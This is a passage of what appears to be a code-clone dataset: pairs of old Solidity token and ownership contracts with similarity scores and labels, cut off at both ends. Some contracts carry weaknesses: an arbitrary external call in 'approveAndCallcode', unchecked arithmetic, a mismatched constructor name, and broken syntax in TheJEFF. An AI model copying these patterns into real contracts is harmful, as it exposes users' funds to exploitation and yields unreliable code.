
    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}",0.960014908,"contract ERC20Token is StandardToken {

    function () {
        
        throw;
    }

    

    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = &#39;H1.0&#39;;       







    function ERC20Token(
        ) {
        balances[msg.sender] = 1000000000;               
        totalSupply = 1000000000;                        
        name = ""Derma"";                                   
        decimals = 0;                            
        symbol = ""DRM"";                               
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}",1,,,,,
"contract ERC20 {
   uint256 public totalSupply;
   function balanceOf(address who) public view returns (uint256);
   function transfer(address to, uint256 value) public returns (bool);
   event Transfer(address indexed from, address indexed to, uint256 value);
   function allowance(address owner, address spender) public view returns (uint256);
   function transferFrom(address from, address to, uint256 value) public returns (bool);
   function approve(address spender, uint256 value) public returns (bool);
   event Approval(address indexed owner, address indexed spender, uint256 value);
}",0.931838262,"contract ERC20 {
    uint public totalSupply;
    function balanceOf(address who) public constant returns (uint);
    function allowance(address owner, address spender) public constant returns (uint);
    function transfer(address to, uint value) public returns (bool ok);
    function transferFrom(address from, address to, uint value) public returns (bool ok);
    function approve(address spender, uint value) public returns (bool ok);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}",1,,,,,
"contract SampleCoin is StandardToken {
   string public name = 'SampleCoin';
   string public symbol = 'SMPL';
   uint public decimals = 0;
   uint public INITIAL_SUPPLY = 1000000000000;

   function SampleCoin() public {
     totalSupply = INITIAL_SUPPLY;
     balances[msg.sender] = INITIAL_SUPPLY;
   }
}",0.900581558,"contract TryCoin is StandardToken {
    string public name = ""TryCoin"";
    string public symbol = ""TRY"";
    uint8 public decimals = 2;
    uint public INITIAL_SUPPLY = 10000000000000;

    function TryCoin() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
    }
}",1,,,,,
"contract DappToken {
    
    string public name = ""DappToken"";
    
    string public symbol = 'DAPP';
    
    string public standard = 'DApp Token v1.0';
    
    uint256 public decimals = 18;
    
    uint256 public tokenPrice = 2000; 

    uint256 public totalSupply;

    event Transfer(
        address indexed _form,
        address indexed _to,
        uint256 _value
        );

    event Approval(
            address indexed _owner,
            address indexed _spender,
            uint256 _value
        );


    mapping(address => uint256) public balanceOf;
    mapping(address => mapping (address => uint256)) public allowance;








    constructor(uint256 _intialSupply) public
            {
                balanceOf[msg.sender] = _intialSupply;
                totalSupply = _intialSupply;
            }

    
    function transfer(address _to,uint256 _value) public returns (bool success){
    
    require(balanceOf[msg.sender] >= _value);
    
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value; 

    
    emit Transfer(msg.sender,_to,_value);

    
    return true;
    } 

    
    function approve(address _spender,uint256 _value) public returns (bool success){
        
        allowance[msg.sender][_spender] = _value;

        
        emit Approval(msg.sender,_spender,_value);
             return true;

    }
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        
        balanceOf[_from] -= _value;

        
       balanceOf[_to] += _value; 

       allowance[_from][msg.sender] -= _value;

       emit Transfer(_from,_to,_value);


        return true;
    }
}",0.901313086,"contract	FGRE_Portfolio_III_883				{				

										

		mapping (address => uint256) public balanceOf;								

										

		string	public		name =	""	FGRE_Portfolio_III_883		""	;

		string	public		symbol =	""	FGRE883III		""	;

		uint8	public		decimals =		18			;

										

		uint256 public totalSupply =		26619797430723400000000000000					;	

										

		event Transfer(address indexed from, address indexed to, uint256 value);								

										

		function SimpleERC20Token() public {								

			balanceOf[msg.sender] = totalSupply;							

			emit Transfer(address(0), msg.sender, totalSupply);							

		}								

										

		function transfer(address to, uint256 value) public returns (bool success) {								

			require(balanceOf[msg.sender] >= value);							

										

			balanceOf[msg.sender] -= value;  

			balanceOf[to] += value;          

			emit Transfer(msg.sender, to, value);							

			return true;							

		}								

										

		event Approval(address indexed owner, address indexed spender, uint256 value);								

										

		mapping(address => mapping(address => uint256)) public allowance;								

										

		function approve(address spender, uint256 value)								

			public							

			returns (bool success)							

		{								

			allowance[msg.sender][spender] = value;							

			emit Approval(msg.sender, spender, value);							

			return true;							

		}								

										

		function transferFrom(address from, address to, uint256 value)								

			public							

			returns (bool success)							

		{								

			require(value <= balanceOf[from]);							

			require(value <= allowance[from][msg.sender]);							

										

			balanceOf[from] -= value;							

			balanceOf[to] += value;							

			allowance[from][msg.sender] -= value;							

			emit Transfer(from, to, value);							

			return true;							

		}								



										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

	}",2,,,,,
"contract Verdot is StandardToken {

function () {
    
    throw;
}




string public name;                   
uint8 public decimals;                
string public symbol;                 
string public version = 'H1.0';       







function Verdot(
    ) {
    balances[msg.sender] =17000000;               
    totalSupply =17000000;                        
    name = ""Verdot"";                                   
    decimals = 0;                            
    symbol = ""VRD"";                               
}


function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);

    
    
    
    if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
    return true;

}
}",0.928754027,"contract GUESS is StandardToken {

    function () {
        
        throw;
    }

    

    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = &#39;1.0&#39;;       







    function GUESS(
        ) {
        balances[msg.sender] = 20000000000;               
        totalSupply = 20000000000;                        
        name = ""GUESS"";                                   
        decimals = 2;                            
        symbol = ""GUESS"";                               
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}",1,,,,,
"contract Owned {
        address public owner;

        function owned() {
            owner = msg.sender;
        }

        modifier onlyOwner {
            require(msg.sender == owner);
            _;
        }

        function transferOwnership(address newOwner) onlyOwner {
            owner = newOwner;
        }        
}",0.989211996,"contract Owned {
	
    address public owner;

	
    function Owned() {
        owner = msg.sender;
    }
	
	
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

	
    function transferOwnership(address newOwner) onlyOwner {
        owner = newOwner;
    }
}",0,,,,,
"contract Ownable {

  address public owner;
  event OwnershipTransferred (address indexed _from, address indexed _to);

  
  function Ownable() public{
    owner = msg.sender;
    OwnershipTransferred(address(0), owner);
  }

  
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    owner = newOwner;
    OwnershipTransferred(owner,newOwner);
  }
}",0.938531161,"contract Ownable {



    address public owner;



    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    

    function Ownable() public {

        owner = msg.sender;

        OwnershipTransferred(0, owner);

    }



    

    function transferOwnership(address _newOwner)

        public

        onlyOwner

    {

        require(_newOwner != 0);



        OwnershipTransferred(owner, _newOwner);

        owner = _newOwner;

    }



}",0,,,,,
"contract StandardToken is Token {

    function transfer(address _to, uint256 _value) returns (bool success) {
        
        
        
        
        if (balances[msg.sender] >= _value && _value > 0) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
           emit Transfer(msg.sender, _to, _value);
            return true;
        } else { return false; }
    }

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        
        
        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
          emit  Transfer(_from, _to, _value);
            return true;
        } else { return false; }
    }

    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
      emit  Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
      return allowed[_owner][_spender];
    }

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    uint256 public totalSupply;
}",0.965329317,"contract StandardToken is Token {



    function transfer(address _to, uint256 _value) public returns (bool success) {

        if (balances[msg.sender] >= _value && _value > 0) {

            balances[msg.sender] -= _value;

            balances[_to] += _value;

            emit Transfer(msg.sender, _to, _value);

            return true;

        } else {

            return false;

        }

    }



    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {

        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {

            balances[_to] += _value;

            balances[_from] -= _value;

            allowed[_from][msg.sender] -= _value;

            emit Transfer(_from, _to, _value);

            return true;

        } else {

            return false;

        }

    }



    function balanceOf(address _owner) public view returns (uint256 balance) {

        return balances[_owner];

    }



    function approve(address _spender, uint256 _value) public returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }



    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {

        return allowed[_owner][_spender];

    }



    mapping (address => uint256) balances;

    mapping (address => mapping (address => uint256)) allowed;

}",0,,,,,
"contract WithdrawDAO {
    DAO constant public mainDAO = DAO(0xbb9bc244d798123fde783fcc1c72d3bb8c189413);
    address public trustee = 0xda4a4626d3e16e094de3225a751aab7128e96526;

    function withdraw(){
        uint balance = mainDAO.balanceOf(msg.sender);

        if (!mainDAO.transferFrom(msg.sender, this, balance) || !msg.sender.send(balance))
            throw;
    }

    function trusteeWithdraw() {
        trustee.send((this.balance + mainDAO.balanceOf(this)) - mainDAO.totalSupply());
    }
}",0.921065649,"contract WithdrawDAO {
    DAO constant public mainDAO = DAO(0xbb9bc244d798123fde783fcc1c72d3bb8c189413);
    address public trustee = 0xcdf7D2D0BdF3511FFf511C62f3C218CF98A136eB; 

    function withdraw(){
        uint balance = mainDAO.balanceOf(msg.sender);

        if (!mainDAO.transferFrom(msg.sender, this, balance) || !msg.sender.send(balance))
            throw;
    }

    function trusteeWithdraw() {
        trustee.send((this.balance + mainDAO.balanceOf(this)) - mainDAO.totalSupply());
    }
}",1,,,,,
"contract Token {
    
    
    uint256 public totalSupply;

    
    
    function balanceOf(address _owner) public constant returns (uint256 balance);

    
    
    
    
    function transfer(address _to, uint256 _value) public returns (bool success);

    
    
    
    
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    
    
    
    
    function approve(address _spender, uint256 _value) public returns (bool success);

    
    
    
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",0.967836446,"contract ERC20 {
  uint256 public totalSupply;
  function balanceOf(address _owner) view public returns (uint256 balance);
  function transfer(address _to, uint256 _value) public returns (bool success);
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
  function approve(address _spender, uint256 _value) public returns (bool success);
  function allowance(address _owner, address _spender) view public returns (uint256 remaining);
  event Transfer(address indexed _from, address indexed _to, uint256 _value);
  event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",1,,,,,
"contract Owned {

    
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    address public owner;

    
    function Owned() public {
        owner = msg.sender;
    }

    address newOwner=0x0;

    event OwnerUpdate(address _prevOwner, address _newOwner);

    
    function changeOwner(address _newOwner) public onlyOwner {
        require(_newOwner != owner);
        newOwner = _newOwner;
    }

    
    function acceptOwnership() public{
        require(msg.sender == newOwner);
        OwnerUpdate(owner, newOwner);
        owner = newOwner;
        newOwner = 0x0;
    }
}",0.958808091,"contract Owned {
    address public owner;
    address public newOwner;

    function Owned() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        assert(msg.sender == owner);
        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != owner);
        newOwner = _newOwner;
    }

    function acceptOwnership() public {
        require(msg.sender == newOwner);
        OwnerUpdate(owner, newOwner);
        owner = newOwner;
        newOwner = 0x0;
    }

    event OwnerUpdate(address _prevOwner, address _newOwner);
}",1,,,,,
"contract MESH is StandardToken {

    function () public {
        revert();
    }

    string public name = ""M2C Mesh Network"";
    uint8 public decimals = 18;
    string public symbol = ""mesh"";


    
    mapping(address => uint256) nonces;

    function MESH (uint256 initialSupply) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);
        balances[msg.sender] = totalSupply;
    }
    
    function transferProxy(address _from, address _to, uint256 _value, uint256 _fee,
        uint8 _v,bytes32 _r, bytes32 _s) public transferAllowed(_from) returns (bool){

        if(balances[_from] < _fee + _value) revert();

        uint256 nonce = nonces[_from];
        bytes32 h = keccak256(_from,_to,_value,_fee,nonce);
        if(_from != ecrecover(h,_v,_r,_s)) revert();

        if(balances[_to] + _value < balances[_to]
            || balances[msg.sender] + _fee < balances[msg.sender]) revert();
        balances[_to] += _value;
        Transfer(_from, _to, _value);

        balances[msg.sender] += _fee;
        Transfer(_from, msg.sender, _fee);

        balances[_from] -= _value + _fee;
        nonces[_from] = nonce + 1;
        return true;
    }

    
    function approveProxy(address _from, address _spender, uint256 _value,
        uint8 _v,bytes32 _r, bytes32 _s) public returns (bool success) {

        uint256 nonce = nonces[_from];
        bytes32 hash = keccak256(_from,_spender,_value,nonce);
        if(_from != ecrecover(hash,_v,_r,_s)) revert();
        allowed[_from][_spender] = _value;
        Approval(_from, _spender, _value);
        nonces[_from] = nonce + 1;
        return true;
    }


    
    function getNonce(address _addr) public constant returns (uint256){
        return nonces[_addr];
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(keccak256(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { revert(); }
        return true;
    }

    
    function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        if(!_spender.call(_extraData)) { revert(); }
        return true;
    }
}",0.993345109,"contract MTC is StandardToken {

    function () public {
        revert();
    }

    string public name = ""M2C Mesh Network"";
    uint8 public decimals = 18;
    string public symbol = ""MTC"";


    
    mapping(address => uint256) nonces;

    function MTC (uint256 initialSupply) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);
        balances[msg.sender] = totalSupply;
    }
    
    function transferProxy(address _from, address _to, uint256 _value, uint256 _fee,
        uint8 _v,bytes32 _r, bytes32 _s) public transferAllowed(_from) returns (bool){

        if(balances[_from] < _fee + _value) revert();

        uint256 nonce = nonces[_from];
        bytes32 h = keccak256(_from,_to,_value,_fee,nonce);
        if(_from != ecrecover(h,_v,_r,_s)) revert();

        if(balances[_to] + _value < balances[_to]
            || balances[msg.sender] + _fee < balances[msg.sender]) revert();
        balances[_to] += _value;
        Transfer(_from, _to, _value);

        balances[msg.sender] += _fee;
        Transfer(_from, msg.sender, _fee);

        balances[_from] -= _value + _fee;
        nonces[_from] = nonce + 1;
        return true;
    }

    
    function approveProxy(address _from, address _spender, uint256 _value,
        uint8 _v,bytes32 _r, bytes32 _s) public returns (bool success) {

        uint256 nonce = nonces[_from];
        bytes32 hash = keccak256(_from,_spender,_value,nonce);
        if(_from != ecrecover(hash,_v,_r,_s)) revert();
        allowed[_from][_spender] = _value;
        Approval(_from, _spender, _value);
        nonces[_from] = nonce + 1;
        return true;
    }


    
    function getNonce(address _addr) public constant returns (uint256){
        return nonces[_addr];
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(keccak256(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { revert(); }
        return true;
    }

    
    function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        if(!_spender.call(_extraData)) { revert(); }
        return true;
    }
}",1,,,,,
"contract TokenERC20 {
    
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        emit Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        emit Burn(_from, _value);
        return true;
    }
}",0.990714595,"contract CCPLUS {
    
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function CCPLUS(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        emit Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        emit Burn(_from, _value);
        return true;
    }
}",1,,,,,
"contract ERC20 { 
    function transfer(address receiver, uint amount) public; 
    function balanceOf(address tokenOwner) public constant returns (uint balance);
}",0.941492972,"contract token{



    function transfer(address receiver, uint amount) public;

    function balanceOf(address receiver) constant public returns (uint balance);

}",1,,,,,
"contract MyCoin is StandardToken {
  string public name = ""MyCoin"";
  string public symbol = ""MC"";
  uint public decimals = 2;
  uint public INITIAL_SUPPLY = 10000 * (10 ** decimals);

  function MyCoin() public {
    totalSupply = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
  }
}",0.907315627,"contract Orocoin is StandardToken

{

  string public name = ""Orocoin"";

  string public symbol = ""ORO"";

  uint public decimals = 6;

  uint public INITIAL_SUPPLY = 100000000 * (10 ** decimals);



  function Orocoin() {

  totalSupply_ = INITIAL_SUPPLY;

  balances[msg.sender] = INITIAL_SUPPLY;

  }

}",1,,,,,
"contract TheJEFF {

string public name;
string public symbol; 
uint8 public decimals = 3;
uint256 public totalSupply; 


mapping (address => uint256) public balanceOf;
mapping (address => mapping (address => uint256)) public allowance;


event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed _owner, address indexed _spender, uint256 _value);


event Burn(address indexed from, uint256 value);


 function TheJEFF(
     uint256intialSupply,
     string tokenName,
     string tokenSymbol
) public {
    totalSupply = intialSupply *50000000.000** uint256(3);
    balanceOf [msg.sender] = totalSupply;
    name = ""TheJEFF"";
    symbol = ""GXAU"";
}
   
function _transfer(address _from, address _to, uint _value) internal {
    
    require(_to != 0x0);
    
    require(balanceOf[_from] >= _value);
    
    require(balanceOf[_to] + _value > balanceOf[_to]);
    
    uint previousBalances = balanceOf[_from] + balanceOf[_to];
    
    balanceOf[_from] -= _value;
    
    balanceOf[_to] += _value;
    emit Transfer (_from, _to, _value);
    
    assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
}



function transfer(address _to, uint256 _value) public returns (bool success) {
    _transfer(msg.sender, _to, _value);
    return true;
}


function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
    require(_value <= allowance[_from][msg.sender]);     
    allowance[_from][msg.sender] -= _value;
    _transfer(_from, _to, _value);
    return true;
}


function approve(address _spender, uint256 _value) public
    returns (bool success) {
    allowance[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
}


function approveAndCall(address _spender, uint256 _value, bytes _extraData)
    public
    returns (bool success) {
    tokenRecipient spender = tokenRecipient(_spender);
    if (approve(_spender, _value)) {
        spender.receiveApproval(msg.sender, _value, this, _extraData);
        return true;
    }
    }
   
  function burnFrom(address _from, uint256 _value) public returns (bool success) 
 {
    require(balanceOf[_from] >= _value);                
    require(_value <= allowance[_from][msg.sender]);    
    balanceOf[_from] -= _value;                         
    allowance[_from][msg.sender] -= _value;             
    totalSupply -= _value;                              
    emit Burn(_from, _value);
    return true;
}
}",0.940000011,"contract BeeUnity {
    
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function BeeUnity(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}",1,,,,,
"contract MyCoin {
    
    string public name = ""MyCoin"";
    string public symbol = ""XYZ"";
    uint8 public decimals = 18;
    
    uint256 public totalSupply;
    uint256 initialSupply = 50000000;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function MyCoin() public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        
        
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}",0.972781526,"contract TokenERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 8;
    uint256 public totalSupply;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Burn(address indexed from, uint256 value);

    
    function TokenERC20() public {
